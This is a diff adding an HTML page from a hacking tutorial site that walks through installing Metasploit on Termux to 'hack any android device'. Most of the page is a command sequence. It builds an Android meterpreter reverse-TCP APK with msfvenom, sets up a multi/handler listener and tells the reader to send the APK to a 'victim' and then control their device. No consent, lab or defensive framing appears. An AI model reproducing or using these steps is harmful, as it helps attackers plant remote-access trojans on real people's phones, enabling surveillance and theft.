@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+<title>THE TECHNO HACK</title>
+
+  
+<!--metadata-->
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="description" content="We help techy people so that they can easily find their way to do somthing special.">
+<meta name="keywords" content="hacking, technology, black hat, white hat,python programming,termux">
+<meta name="author" content="Sumit Patidar">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+<!--stylesheets-->
+<link rel="stylesheet" href="css/materialize.min.css">
+<link rel="stylesheet" href="css/style.css">
+</head>
+
+<body>
+  
+<!--header start from here-->
+<header class="container">
+<div class="col s6 m12 l12" style="margin-left: 10px; margin-right: 10px;">
+
+<div class="nav-wrap">
+<a href="#"><img class="circle responsive-img glow nav-img" src="icons/site_logo.png" alt="thetechnohack's blog"></a>
+<div class="white-text text-glow fluid-text">The Techno Hack</div>
+</div>
+
+
+<!--social media logoes-->
+<div class="row">
+<div class="col s12 m12 l6 sub-social">
+<a href="#" target="_blank">
+<img src="icons/github.svg" alt="github" class="btn-floating grey darken-4 hoverable z-depth-3">
+</a>
+
+<a href="https://www.youtube.com/channel/UCN_HN02IAqjYvaCEU_ggnFw" target="_blank">
+<img src="icons/youtube.svg" alt="youtube" class="btn-floating grey darken-4 hoverable z-depth-3 ">
+</a>
+
+<a href="https://www.instagram.com/invites/contact/?i=gsmjyb1v2c9t&utm_content=ivif6kj" target="_blank">
+<img src="icons/insta1.jpeg" alt="instagram" class="btn-floating grey darken-4 hoverable z-depth-3">
+</a>
+
+
+<a href="https://t.me/ComputerBuddy" target="_blank">
+<img src="icons/telegram.svg" alt="telegram 1" class="btn-floating grey darken-4 hoverable z-depth-3">
+</a>
+
+<a href="https://t.me/Thetechnohack" target="_blank">
+<img src="icons/telegram.svg" alt="telegram 2" class="btn-floating grey darken-4 hoverable z-depth-3">
+</a>
+
+</div>
+
+<div class="col s12 m12 l6">
+<div class="go-right">
+<button class="btn-abt hoverable z-depth-3" onclick="window.location.href='about.html'">About us</button>
+<button class="btn-abt hoverable z-depth-3" onclick="window.location.href='https://t.me/Technohackerspro'">Discuss</button>
+</div>
+</div>
+
+</div>
+</div>
+</header>
+<!--header ends here-->
+
+
+<main>
+<div class="container">
+<div class="row">
+
+<div class="col s12 m12 l12">
+<div class="card-panel glow card-mod">
+
+<h3 class="white-text text-glow">Get Resources:</h3>
+<p class="about-text white-text text-glow">Get essential resources to install metasploit on your system.<br>
+<br>
+What is metasploit ? <br><br>
+Simply,metasploit is a penetration testing framework that makes hacking simple. It's an essential tool for many attackers and defenders.<br> 
+</p>
+<br>
+<div class="grey darken-4 hoverable ">
+<img src="images/metasploit.png" alt="image" width="100%" height="100%">
+</div>
+<div class="go-right">
+<button class="btn-abt hoverable z-depth-3" onclick="window.location.href='https://www.metasploit.com/'">Visit Official Site</button>
+</div>
+<br>
+<br>
+
+<h6 class="white-text text-glow">Installation Commands:</h6>
+<h6 class="white-text">Install metasploit and create a payload to hack any android device on termux: </h6>
+<br>
+<h6 class="cyan-text">1.Install metasploit:</h6>
+<br>
+<pre><code>$ pkg install unstable-repo
+$ pkg install metasploit
+</code></pre>
+
+<h6 class="cyan-text">2.Now create a apk payload by the following command:</h6>
+
+<pre><code>$ msfvenom -p android/meterpreter/reverse_tcp LHOST=[YOUR IP] LPORT=4040 -f raw -o /storage/emulated/0/appname.apk</pre></code>
+
+<h6 class="cyan-text">3.Now open metasploit framework:</h6>
+<pre><code>$ msfconsole
+</code></pre>
+
+<h6 class="cyan-text">4.Now,create an exploit using following commands:</h6>
+<pre><code>$ use exploit/multi/handler
+$ set payload android/meterpreter/reverse_tcp
+$ set lhost [your IP]
+$ set lport 4040</code></pre>
+
+<h6 class="cyan-text">4.Finally,send the payload to your victim and when you realise that victim has clicked on apk payload— type the following command:</h6>
+
+<pre><code>$ exploit</code></pre>
+
+<h6 class="cyan-text">5.Now when you see that session is running you can do anything to victims device with some simple commands:<br>
+To view those commands just type:
+</h6>
+<pre><code>$ show options</code></pre>
+<h6 class="cyan-text">Or download command file from here :</h6>
+<div class="go-right">
+<button class="btn-abt hoverable z-depth-3" onclick="window.location.href='https://drive.google.com/file/d/13KIo9FK021n-0P90jIwMmWd4Uz-8XETk/view?usp=drivesdk'">Download Command File</button>
+</div>
+
+
+<p class="about-text white-text text-glow">For detailed explanation about metasploit view our blog :</p>
+<div class="go-right">
+<button class="btn-abt hoverable z-depth-3" onclick="window.location.href='http://metasploit0tth.blogspot.com/2020/09/metasploit-part2.html'">View Detailed Blog</button>
+</div>
+
+
+</div>
+</div>
+
+</div>
+</div>
+
+</main>
+
+<!--footer credit-->
+<footer class="page-footer glow center dark-grey">
+<div class="footer-copyright">
+<div class="container">With ♥️ from 'The Techno Hack' team
+</div>
+</div>
+</footer>
+
+
+<!--Compiled and minified JavaScript -->
+<script src="/js/materialize.min.js"></script>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
